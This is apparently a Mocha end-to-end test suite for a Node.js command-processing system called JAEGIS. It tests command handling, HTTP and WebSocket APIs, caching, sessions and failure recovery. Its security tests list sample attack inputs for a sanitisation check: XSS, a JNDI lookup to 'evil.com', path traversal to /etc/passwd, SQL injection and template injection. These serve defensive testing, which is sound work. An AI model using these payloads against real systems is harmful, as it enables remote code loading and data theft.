/**
 * JAEGIS End-to-End Workflow Tests
 * Complete command processing workflows from input to output
 * 
 * @version 2.0.0
 * @author JAEGIS Development Team
 */

const { describe, it, beforeEach, afterEach, before, after } = require('mocha')
const { expect } = require('chai')
const request = require('supertest')
const WebSocket = require('ws')

const { setupTests, teardownTests, TestUtils } = require('../setup')

// Import the complete system
const JAEGISSystem = require('../../src/nodejs/index')

describe('End-to-End Workflow Tests', () => {
  let system
  let server
  let wsServer
  let testConfig

  before(async () => {
    await setupTests()
    testConfig = global.testConfig
  })

  after(async () => {
    await teardownTests()
  })

  beforeEach(async () => {
    // Initialize complete JAEGIS system
    system = new JAEGISSystem(testConfig)
    await system.initialize()
    
    // Start HTTP server
    server = system.startServer()
    
    // Start WebSocket server
    wsServer = system.startWebSocketServer()
    
    // Wait for servers to be ready
    await TestUtils.waitFor(() => system.isReady(), 10000)
  })

  afterEach(async () => {
    if (wsServer) {
      wsServer.close()
    }
    if (server) {
      server.close()
    }
    if (system) {
      await system.shutdown()
    }
  })

  describe('Complete Command Processing Workflows', () => {
    it('should process help command through complete pipeline', async () => {
      const workflow = {
        input: {
          command: '/help',
          parameters: {},
          context: {
            user: 'e2e-test-user',
            requestId: 'e2e-help-001'
          }
        },
        expectedSteps: [
          'input_validation',
          'decision_making',
          'github_data_fetch',
          'command_parsing',
          'plugin_execution',
          'response_formatting',
          'output_generation'
        ]
      }

      const result = await system.processCommand(
        workflow.input.command,
        workflow.input.parameters,
        workflow.input.context
      )

      // Verify successful completion
      expect(result.success).to.be.true
      expect(result.requestId).to.equal('e2e-help-001')
      expect(result).to.have.property('data')
      expect(result.data).to.have.property('title')
      expect(result.data).to.have.property('available_commands')

      // Verify workflow steps were executed
      const executionTrace = result.executionTrace || []
      workflow.expectedSteps.forEach(step => {
        expect(executionTrace.some(trace => trace.step === step)).to.be.true
      })

      // Verify timing information
      expect(result).to.have.property('processingTime')
      expect(result.processingTime).to.be.a('number')
      expect(result.processingTime).to.be.greaterThan(0)
    })

    it('should process status command with system metrics', async () => {
      const workflow = {
        input: {
          command: '/status',
          parameters: {},
          context: {
            user: 'e2e-test-user',
            format: 'json'
          }
        }
      }

      const result = await system.processCommand(
        workflow.input.command,
        workflow.input.parameters,
        workflow.input.context
      )

      expect(result.success).to.be.true
      expect(result.data).to.have.property('system')
      expect(result.data).to.have.property('executor')
      expect(result.data).to.have.property('services')

      // Verify system metrics
      expect(result.data.system).to.have.property('status')
      expect(result.data.system).to.have.property('uptime')
      expect(result.data.system).to.have.property('version')

      // Verify service status
      expect(result.data.services).to.have.property('cache')
      expect(result.data.services).to.have.property('python_bridge')
      expect(result.data.services.cache).to.have.property('status')
      expect(result.data.services.python_bridge).to.have.property('status')
    })

    it('should handle command with parameters through complete workflow', async () => {
      const workflow = {
        input: {
          command: '/help',
          parameters: {
            command: 'status',
            format: 'detailed'
          },
          context: {
            user: 'e2e-test-user',
            session: 'e2e-session-001'
          }
        }
      }

      const result = await system.processCommand(
        workflow.input.command,
        workflow.input.parameters,
        workflow.input.context
      )

      expect(result.success).to.be.true
      expect(result.data).to.have.property('command', 'status')
      expect(result.data).to.have.property('description')
      expect(result.data).to.have.property('usage')
      expect(result.data).to.have.property('examples')

      // Verify parameter processing
      expect(result.parameters).to.deep.include(workflow.input.parameters)
    })

    it('should process complex analytics command', async () => {
      const workflow = {
        input: {
          command: '/analytics',
          parameters: {
            timeframe: '24h',
            metrics: ['performance', 'usage', 'errors']
          },
          context: {
            user: 'e2e-admin-user',
            permissions: ['analytics', 'admin']
          }
        }
      }

      const result = await system.processCommand(
        workflow.input.command,
        workflow.input.parameters,
        workflow.input.context
      )

      expect(result.success).to.be.true
      expect(result.data).to.have.property('system_performance')
      expect(result.data).to.have.property('command_statistics')
      expect(result.data).to.have.property('error_analysis')

      // Verify analytics data structure
      expect(result.data.system_performance).to.have.property('cpu')
      expect(result.data.system_performance).to.have.property('memory')
      expect(result.data.command_statistics).to.have.property('total_commands')
      expect(result.data.error_analysis).to.have.property('error_rate')
    })
  })

  describe('Error Handling Workflows', () => {
    it('should handle unknown command with suggestions', async () => {
      const workflow = {
        input: {
          command: '/unknowncommand',
          parameters: {},
          context: {
            user: 'e2e-test-user'
          }
        }
      }

      const result = await system.processCommand(
        workflow.input.command,
        workflow.input.parameters,
        workflow.input.context
      )

      expect(result.success).to.be.false
      expect(result).to.have.property('error')
      expect(result.error).to.have.property('type')
      expect(result.error).to.have.property('message')

      // Verify suggestions are provided
      expect(result).to.have.property('suggestions')
      expect(result.suggestions).to.be.an('array')
      expect(result.suggestions.length).to.be.greaterThan(0)

      // Verify recovery information
      expect(result).to.have.property('recovery')
      expect(result.recovery).to.have.property('strategy')
    })

    it('should handle invalid parameters with validation errors', async () => {
      const workflow = {
        input: {
          command: '/help',
          parameters: {
            command: '', // Invalid empty command
            invalidParam: 'should-be-ignored'
          },
          context: {
            user: 'e2e-test-user'
          }
        }
      }

      const result = await system.processCommand(
        workflow.input.command,
        workflow.input.parameters,
        workflow.input.context
      )

      // Should handle gracefully and provide general help
      expect(result.success).to.be.true
      expect(result.data).to.have.property('title')

      // Invalid parameters should be filtered out
      expect(result.parameters).to.not.have.property('invalidParam')
    })

    it('should recover from service failures', async () => {
      // Simulate Python service failure
      const originalPythonBridge = system.pythonBridge
      system.pythonBridge = {
        ...originalPythonBridge,
        fetchGitHubCommands: async () => {
          throw new Error('Python service unavailable')
        }
      }

      const workflow = {
        input: {
          command: '/help',
          parameters: {},
          context: {
            user: 'e2e-test-user'
          }
        }
      }

      const result = await system.processCommand(
        workflow.input.command,
        workflow.input.parameters,
        workflow.input.context
      )

      // Should still work with degraded functionality
      expect(result.success).to.be.true
      expect(result.data).to.have.property('title')

      // Should indicate degraded service
      expect(result).to.have.property('warnings')
      expect(result.warnings).to.be.an('array')

      // Restore original service
      system.pythonBridge = originalPythonBridge
    })
  })

  describe('HTTP API Workflows', () => {
    it('should process command via HTTP POST', async () => {
      const response = await request(server)
        .post('/api/command')
        .send({
          command: '/status',
          parameters: {},
          context: {
            user: 'http-test-user',
            format: 'json'
          }
        })
        .expect(200)

      expect(response.body.success).to.be.true
      expect(response.body.data).to.have.property('system')
      expect(response.body).to.have.property('requestId')
      expect(response.body).to.have.property('processingTime')

      // Verify HTTP-specific metadata
      expect(response.body.metadata).to.have.property('method', 'http')
      expect(response.body.metadata).to.have.property('userAgent')
    })

    it('should handle HTTP rate limiting', async () => {
      const requests = []
      const maxRequests = 20 // Exceed rate limit

      // Send multiple requests rapidly
      for (let i = 0; i < maxRequests; i++) {
        requests.push(
          request(server)
            .post('/api/command')
            .send({
              command: '/help',
              context: { user: `rate-test-${i}` }
            })
        )
      }

      const responses = await Promise.allSettled(requests)
      
      // Some should succeed, some should be rate limited
      const successful = responses.filter(r => r.status === 'fulfilled' && r.value.status === 200)
      const rateLimited = responses.filter(r => r.status === 'fulfilled' && r.value.status === 429)

      expect(successful.length).to.be.greaterThan(0)
      expect(rateLimited.length).to.be.greaterThan(0)
    })

    it('should provide proper CORS headers', async () => {
      const response = await request(server)
        .options('/api/command')
        .expect(200)

      expect(response.headers).to.have.property('access-control-allow-origin')
      expect(response.headers).to.have.property('access-control-allow-methods')
      expect(response.headers).to.have.property('access-control-allow-headers')
    })
  })

  describe('WebSocket Workflows', () => {
    it('should process command via WebSocket', (done) => {
      const ws = new WebSocket(`ws://localhost:${wsServer.address().port}`)
      
      ws.on('open', () => {
        ws.send(JSON.stringify({
          type: 'command',
          id: 'ws-test-001',
          command: '/status',
          parameters: {},
          context: {
            user: 'ws-test-user'
          }
        }))
      })

      ws.on('message', (data) => {
        const response = JSON.parse(data)
        
        expect(response.type).to.equal('response')
        expect(response.id).to.equal('ws-test-001')
        expect(response.payload.success).to.be.true
        expect(response.payload.data).to.have.property('system')

        ws.close()
        done()
      })

      ws.on('error', done)
    })

    it('should handle WebSocket real-time updates', (done) => {
      const ws = new WebSocket(`ws://localhost:${wsServer.address().port}`)
      let updateReceived = false

      ws.on('open', () => {
        // Subscribe to updates
        ws.send(JSON.stringify({
          type: 'subscribe',
          channel: 'system-metrics'
        }))

        // Trigger an update
        setTimeout(() => {
          system.broadcastUpdate('system-metrics', {
            cpu: 25.5,
            memory: 67.2,
            timestamp: Date.now()
          })
        }, 100)
      })

      ws.on('message', (data) => {
        const message = JSON.parse(data)
        
        if (message.type === 'update') {
          expect(message.channel).to.equal('system-metrics')
          expect(message.data).to.have.property('cpu')
          expect(message.data).to.have.property('memory')
          expect(message.data).to.have.property('timestamp')
          
          updateReceived = true
          ws.close()
          done()
        }
      })

      ws.on('error', done)

      // Timeout if no update received
      setTimeout(() => {
        if (!updateReceived) {
          ws.close()
          done(new Error('No update received within timeout'))
        }
      }, 5000)
    })

    it('should handle WebSocket connection limits', async () => {
      const connections = []
      const maxConnections = 10

      try {
        // Create multiple connections
        for (let i = 0; i < maxConnections; i++) {
          const ws = new WebSocket(`ws://localhost:${wsServer.address().port}`)
          connections.push(ws)
          
          await new Promise((resolve) => {
            ws.on('open', resolve)
          })
        }

        expect(connections.length).to.equal(maxConnections)

        // All connections should be active
        connections.forEach(ws => {
          expect(ws.readyState).to.equal(WebSocket.OPEN)
        })

      } finally {
        // Clean up connections
        connections.forEach(ws => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.close()
          }
        })
      }
    })
  })

  describe('Performance Workflows', () => {
    it('should maintain performance under load', async () => {
      const concurrentRequests = 20
      const startTime = Date.now()

      const promises = Array.from({ length: concurrentRequests }, (_, i) => 
        system.processCommand('/help', {}, { user: `load-test-${i}` })
      )

      const results = await Promise.all(promises)
      const totalTime = Date.now() - startTime

      // All requests should succeed
      results.forEach(result => {
        expect(result.success).to.be.true
      })

      // Performance should be reasonable
      const avgTime = totalTime / concurrentRequests
      expect(avgTime).to.be.lessThan(1000) // Less than 1 second average

      // Check system metrics after load
      const systemStatus = await system.getSystemStatus()
      expect(systemStatus.performance).to.have.property('requestsProcessed')
      expect(systemStatus.performance.requestsProcessed).to.be.greaterThanOrEqual(concurrentRequests)
    })

    it('should show cache effectiveness in workflows', async () => {
      const command = '/help'
      const iterations = 5

      // Clear cache first
      await system.cache.clear()

      const times = []

      for (let i = 0; i < iterations; i++) {
        const startTime = Date.now()
        const result = await system.processCommand(command, {}, { user: `cache-test-${i}` })
        const endTime = Date.now()

        expect(result.success).to.be.true
        times.push(endTime - startTime)
      }

      // Later executions should be faster due to caching
      const firstTime = times[0]
      const lastTime = times[times.length - 1]
      
      expect(lastTime).to.be.lessThanOrEqual(firstTime * 1.5) // Allow some variance

      // Check cache statistics
      const cacheStats = system.cache.getStats()
      expect(cacheStats.memory.hits).to.be.greaterThan(0)
    })
  })

  describe('Security Workflows', () => {
    it('should sanitize malicious input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        'DROP TABLE users;',
        '{{7*7}}'
      ]

      for (const maliciousInput of maliciousInputs) {
        const result = await system.processCommand('/help', {
          command: maliciousInput
        }, {
          user: 'security-test'
        })

        // Should handle gracefully without executing malicious code
        expect(result.success).to.be.true
        
        // Response should not contain the malicious input
        const responseStr = JSON.stringify(result)
        expect(responseStr).to.not.include('<script>')
        expect(responseStr).to.not.include('${jndi:')
        expect(responseStr).to.not.include('../../../')
      }
    })

    it('should validate input parameters', async () => {
      const invalidInputs = [
        { command: '', parameters: {} }, // Empty command
        { command: 'a'.repeat(1000), parameters: {} }, // Too long command
        { command: '/help', parameters: { param: 'x'.repeat(10000) } }, // Too long parameter
        { command: '/help', parameters: null }, // Null parameters
        { command: null, parameters: {} } // Null command
      ]

      for (const input of invalidInputs) {
        const result = await system.processCommand(
          input.command,
          input.parameters,
          { user: 'validation-test' }
        )

        // Should handle gracefully
        if (result.success === false) {
          expect(result).to.have.property('error')
          expect(result.error).to.have.property('type')
        }
      }
    })
  })

  describe('Context and Session Workflows', () => {
    it('should maintain context across multiple commands', async () => {
      const sessionId = 'e2e-session-001'
      const userId = 'e2e-context-user'

      // First command
      const result1 = await system.processCommand('/help', {}, {
        user: userId,
        session: sessionId
      })

      expect(result1.success).to.be.true

      // Second command in same session
      const result2 = await system.processCommand('/status', {}, {
        user: userId,
        session: sessionId
      })

      expect(result2.success).to.be.true

      // Context should be maintained
      expect(result2.context).to.have.property('session', sessionId)
      expect(result2.context).to.have.property('user', userId)

      // Session should have command history
      const sessionData = await system.getSessionData(sessionId)
      expect(sessionData).to.have.property('commands')
      expect(sessionData.commands.length).to.be.greaterThanOrEqual(2)
    })

    it('should handle session timeout', async () => {
      const shortSessionId = 'short-session-001'
      
      // Create session with short timeout
      await system.createSession(shortSessionId, {
        timeout: 100 // 100ms timeout
      })

      // Wait for timeout
      await TestUtils.delay(150)

      // Session should be expired
      const sessionData = await system.getSessionData(shortSessionId)
      expect(sessionData).to.be.null
    })
  })

  describe('Monitoring and Observability Workflows', () => {
    it('should generate comprehensive execution traces', async () => {
      const result = await system.processCommand('/analytics', {}, {
        user: 'trace-test-user',
        enableTracing: true
      })

      expect(result.success).to.be.true
      expect(result).to.have.property('executionTrace')
      expect(result.executionTrace).to.be.an('array')
      expect(result.executionTrace.length).to.be.greaterThan(0)

      // Verify trace structure
      result.executionTrace.forEach(trace => {
        expect(trace).to.have.property('step')
        expect(trace).to.have.property('timestamp')
        expect(trace).to.have.property('duration')
      })
    })

    it('should track performance metrics throughout workflow', async () => {
      const initialMetrics = await system.getPerformanceMetrics()
      
      // Execute several commands
      await system.processCommand('/help', {}, { user: 'metrics-test-1' })
      await system.processCommand('/status', {}, { user: 'metrics-test-2' })
      await system.processCommand('/analytics', {}, { user: 'metrics-test-3' })

      const finalMetrics = await system.getPerformanceMetrics()

      // Metrics should have increased
      expect(finalMetrics.totalCommands).to.be.greaterThan(initialMetrics.totalCommands)
      expect(finalMetrics.totalRequests).to.be.greaterThan(initialMetrics.totalRequests)

      // Performance data should be available
      expect(finalMetrics).to.have.property('averageResponseTime')
      expect(finalMetrics).to.have.property('successRate')
      expect(finalMetrics.successRate).to.be.greaterThan(95) // Should maintain high success rate
    })
  })

  describe('Recovery and Resilience Workflows', () => {
    it('should recover from temporary failures', async () => {
      let failureCount = 0
      const maxFailures = 2

      // Mock temporary failures
      const originalProcessCommand = system.processCommand
      system.processCommand = async function(...args) {
        failureCount++
        if (failureCount <= maxFailures) {
          throw new Error('Temporary system failure')
        }
        return originalProcessCommand.apply(this, args)
      }

      // Should eventually succeed with retry logic
      let finalResult
      let attempts = 0
      const maxAttempts = 5

      while (attempts < maxAttempts) {
        try {
          finalResult = await system.processCommand('/help', {}, { user: 'recovery-test' })
          break
        } catch (error) {
          attempts++
          await TestUtils.delay(100) // Brief delay between retries
        }
      }

      expect(finalResult).to.exist
      expect(finalResult.success).to.be.true

      // Restore original method
      system.processCommand = originalProcessCommand
    })

    it('should maintain service during partial component failures', async () => {
      // Disable Python bridge
      const originalPythonBridge = system.pythonBridge
      system.pythonBridge = null

      // Basic commands should still work
      const result = await system.processCommand('/help', {}, { user: 'resilience-test' })
      
      expect(result.success).to.be.true
      expect(result.data).to.have.property('title')

      // Should indicate degraded service
      expect(result).to.have.property('warnings')

      // Restore Python bridge
      system.pythonBridge = originalPythonBridge
    })
  })
})